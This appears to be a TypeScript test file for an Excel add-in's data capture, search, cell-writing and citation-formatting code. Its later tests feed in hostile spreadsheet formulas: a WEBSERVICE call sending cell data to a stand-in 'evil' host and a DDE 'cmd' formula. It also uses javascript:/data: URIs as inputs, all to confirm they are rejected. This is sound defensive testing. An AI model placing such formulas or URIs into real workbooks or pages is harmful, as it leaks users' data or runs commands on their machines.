import { describe, it, expect } from 'vitest';
import { ResolvedContextSchema, asChangeId } from '@ge/contracts';
import {
  MAX_SEARCH_ROWS,
  rangeToContext,
  searchUsedRange,
  selectionValuesToContext,
  splitHeaderRows,
  usedRangeToBlocks,
} from './capture.js';
import {
  formatSourceComment,
  isUnsafeFormula,
  planWriteCells,
  splitFormulaGrid,
} from './actuate-plan.js';

describe('excel capture (pure)', () => {
  it('splits a grid into header columns and data rows', () => {
    const { columns, rows } = splitHeaderRows([
      ['Region', 'Revenue'],
      ['EMEA', '120'],
      ['APAC', '90'],
    ]);
    expect(columns).toEqual(['Region', 'Revenue']);
    expect(rows).toEqual([
      ['EMEA', '120'],
      ['APAC', '90'],
    ]);
    expect(splitHeaderRows([])).toEqual({ columns: [], rows: [] });
  });

  it('produces valid, anchored context as a GFM table from a range', () => {
    const ctx = rangeToContext('Sheet1!A1:B3', [
      ['Region', 'Revenue'],
      ['EMEA', '120'],
      ['APAC', '90'],
    ]);
    expect(ctx.length).toBeGreaterThan(0);
    for (const c of ctx) expect(() => ResolvedContextSchema.parse(c)).not.toThrow();

    const table = ctx.find((c) => c.value.as === 'text' && c.value.text.includes('|'));
    expect(table).toBeDefined();
    if (table && table.value.as === 'text') {
      expect(table.value.text).toContain('Region');
      expect(table.value.text).toContain('| --- |');
    }
    expect(ctx.some((c) => c.ref.anchor?.locator === 'range:Sheet1!A1:B3')).toBe(true);
  });

  it('returns nothing for an empty grid', () => {
    expect(rangeToContext('Sheet1!A1', [])).toHaveLength(0);
  });

  it('selectionValuesToContext mirrors rangeToContext', () => {
    const ctx = selectionValuesToContext('Sheet1!A1:A2', [['Name'], ['Ada']]);
    expect(ctx.some((c) => c.ref.anchor?.locator === 'range:Sheet1!A1:A2')).toBe(true);
  });
});

describe('excel doc-state blocks (pure, ADR-0003)', () => {
  it('maps a used range to one anchored native table block', () => {
    const blocks = usedRangeToBlocks('Sheet1!A1:B3', [
      ['Region', 'Revenue'],
      ['EMEA', '120'],
      ['APAC', '90'],
    ]);
    expect(blocks).toHaveLength(1);
    expect(blocks[0]?.kind).toBe('table');
    expect(blocks[0]?.locator).toBe('range:Sheet1!A1:B3');
    expect(blocks[0]?.data).toEqual({
      columns: ['Region', 'Revenue'],
      rows: [
        ['EMEA', '120'],
        ['APAC', '90'],
      ],
    });
  });

  it('returns no blocks for an empty grid', () => {
    expect(usedRangeToBlocks('Sheet1!A1', [])).toHaveLength(0);
  });
});

describe('excel searchUsedRange (pure, ADR-0003 lazy read)', () => {
  const grid = [
    ['Region', 'Revenue'],
    ['EMEA', '120'],
    ['APAC', '90'],
    ['emea-west', '45'],
  ];

  it('returns matching rows (case-insensitive) with the header preserved, as anchored context', () => {
    const ctx = searchUsedRange('Sheet1!A1:B4', grid, 'emea');
    expect(ctx.length).toBeGreaterThan(0);
    const table = ctx.find((c) => c.value.as === 'text' && c.value.text.includes('|'));
    expect(table).toBeDefined();
    if (table && table.value.as === 'text') {
      // Header + the two EMEA rows, not APAC.
      expect(table.value.text).toContain('Region');
      expect(table.value.text).toContain('EMEA');
      expect(table.value.text).toContain('emea-west');
      expect(table.value.text).not.toContain('APAC');
    }
    expect(ctx.some((c) => c.ref.anchor?.locator === 'range:Sheet1!A1:B4')).toBe(true);
  });

  it('matches on any cell, not just the first column', () => {
    const ctx = searchUsedRange('Sheet1!A1:B4', grid, '120');
    const table = ctx.find((c) => c.value.as === 'text');
    expect(table).toBeDefined();
    if (table && table.value.as === 'text') expect(table.value.text).toContain('EMEA');
  });

  it('returns [] for an empty query, no header, or no match', () => {
    expect(searchUsedRange('Sheet1!A1:B4', grid, '   ')).toEqual([]);
    expect(searchUsedRange('Sheet1!A1', [], 'x')).toEqual([]);
    expect(searchUsedRange('Sheet1!A1:B4', grid, 'nonexistent')).toEqual([]);
  });

  it('bounds the number of matched rows', () => {
    const many = [['H'], ...Array.from({ length: 50 }, () => ['hit'])];
    const ctx = searchUsedRange('Sheet1!A1:A51', many, 'hit');
    const table = ctx.find((c) => c.value.as === 'text');
    expect(table).toBeDefined();
    if (table && table.value.as === 'text') {
      // Header + at most MAX_SEARCH_ROWS data rows.
      const dataRows = table.value.text.split('\n').filter((l) => l.includes('hit')).length;
      expect(dataRows).toBeLessThanOrEqual(MAX_SEARCH_ROWS);
    }
  });
});

describe('excel actuation planning (pure)', () => {
  it('extracts address + values for write-cells', () => {
    const plan = planWriteCells({
      changeId: asChangeId('c1'),
      kind: 'write-cells',
      surface: 'excel',
      params: {
        target: { range: 'Sheet1!A1:B2' },
        cells: [
          ['Region', 'Revenue'],
          ['EMEA', '120'],
        ],
      },
    });
    expect(plan).toEqual({
      address: 'Sheet1!A1:B2',
      values: [
        ['Region', 'Revenue'],
        ['EMEA', '120'],
      ],
    });
  });

  it('defaults values to [] and omits address when absent', () => {
    const plan = planWriteCells({
      changeId: asChangeId('c2'),
      kind: 'write-cells',
      surface: 'excel',
      params: {},
    });
    expect(plan).toEqual({ values: [] });
  });
});

describe('splitFormulaGrid (formula-first, pure)', () => {
  it('routes =-prefixed cells into formulas (null in values) and literals into values', () => {
    const grid = splitFormulaGrid([
      ['Revenue', '=SUM(B2:B3)'],
      ['120', '=A2*2'],
    ]);
    expect(grid.hasFormulas).toBe(true);
    expect(grid.formulas).toEqual([
      [null, '=SUM(B2:B3)'],
      [null, '=A2*2'],
    ]);
    expect(grid.values).toEqual([
      ['Revenue', null],
      ['120', null],
    ]);
  });

  it('leaves an all-values grid unchanged with hasFormulas false', () => {
    const grid = splitFormulaGrid([
      ['Region', 'Revenue'],
      ['EMEA', '120'],
    ]);
    expect(grid.hasFormulas).toBe(false);
    expect(grid.formulas).toEqual([
      [null, null],
      [null, null],
    ]);
    expect(grid.values).toEqual([
      ['Region', 'Revenue'],
      ['EMEA', '120'],
    ]);
  });

  it('detects a formula only by a leading =, not = elsewhere in the cell', () => {
    const grid = splitFormulaGrid([['a=b', '=b', ' =c']]);
    expect(grid.hasFormulas).toBe(true);
    // 'a=b' is a literal; '=b' is a formula; ' =c' (leading space) is a literal.
    expect(grid.formulas).toEqual([[null, '=b', null]]);
    expect(grid.values).toEqual([['a=b', null, ' =c']]);
  });

  it('handles an empty grid', () => {
    expect(splitFormulaGrid([])).toEqual({
      formulas: [],
      values: [],
      hasFormulas: false,
      rejected: [],
    });
  });

  it('rejects unsafe active-content formulas instead of evaluating them', () => {
    const grid = splitFormulaGrid([
      ['=SUM(A1:A2)', '=WEBSERVICE("http://evil/?d="&A1)'],
      ["=cmd|'/c calc'!A1", "=HYPERLINK('[Book.xlsx]Sheet1'!A1)"],
    ]);
    // The safe SUM is still routed to formulas; the three vectors are rejected, not evaluated.
    expect(grid.rejected).toHaveLength(3);
    expect(grid.formulas[0]?.[0]).toBe('=SUM(A1:A2)');
    expect(grid.formulas[0]?.[1]).toBeNull();
    expect(grid.formulas[1]).toEqual([null, null]);
    // Rejected cells appear in neither grid (both null) so they can never be written/evaluated.
    expect(grid.values[0]?.[1]).toBeNull();
  });

  it('isUnsafeFormula flags web/data/DDE/external-ref, allows pure computation', () => {
    expect(isUnsafeFormula('=SUM(A1:B2)')).toBe(false);
    expect(isUnsafeFormula('=A1*2+VLOOKUP(B1,C:D,2,0)')).toBe(false);
    expect(isUnsafeFormula('=WEBSERVICE("http://x")')).toBe(true);
    expect(isUnsafeFormula('=IMPORTDATA("http://x")')).toBe(true);
    expect(isUnsafeFormula("=cmd|'/c calc'!A1")).toBe(true);
    expect(isUnsafeFormula("='[Budget.xlsx]Q1'!A1")).toBe(true);
  });
});

describe('formatSourceComment (citations, pure)', () => {
  it('renders Title (uri) one per line, dropping the uri when absent', () => {
    const text = formatSourceComment([
      { title: 'SLA Policy', uri: 'https://acme/sla' },
      { title: 'Uptime Memo' },
    ]);
    expect(text).toBe('SLA Policy (https://acme/sla)\nUptime Memo');
  });

  it('returns an empty string for no sources', () => {
    expect(formatSourceComment([])).toBe('');
  });

  it('caps overly long output with an ellipsis', () => {
    const long = 'x'.repeat(100);
    const text = formatSourceComment([{ title: long }], 20);
    expect(text).toHaveLength(20);
    expect(text.endsWith('…')).toBe(true);
  });

  it('does not cap output already within the limit', () => {
    const text = formatSourceComment([{ title: 'short' }], 20);
    expect(text).toBe('short');
  });

  it('drops a non-http(s) uri scheme and single-lines a crafted title', () => {
    const text = formatSourceComment([
      { title: 'Click', uri: 'javascript:alert(1)' },
      { title: 'Line1\nLine2 forged source', uri: 'data:text/html,evil' },
    ]);
    // javascript:/data: uris are dropped; newlines in the title can't forge extra source lines.
    expect(text).toBe('Click\nLine1 Line2 forged source');
    expect(text).not.toContain('javascript:');
    expect(text).not.toContain('data:');
  });
});
